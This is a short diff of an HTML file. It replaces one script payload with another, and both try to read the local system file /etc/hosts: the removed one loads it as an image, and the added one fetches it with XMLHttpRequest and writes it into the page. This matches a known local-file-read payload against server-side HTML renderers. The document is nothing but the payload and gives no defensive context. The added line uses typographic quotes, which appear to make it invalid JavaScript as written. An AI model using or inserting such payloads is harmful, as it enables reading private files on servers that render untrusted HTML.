@@ -1,9 +1,1 @@
-<body id="body">
-
-<script>
-    jsImg = new Image()
-    jsImg.src="file:///etc/hosts"
-    document.getElementById("body").appendChild(jsImg);
-</script>
-
-</body>
+<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open(‘GET’,’file:///etc/hosts’);x.send();</script>
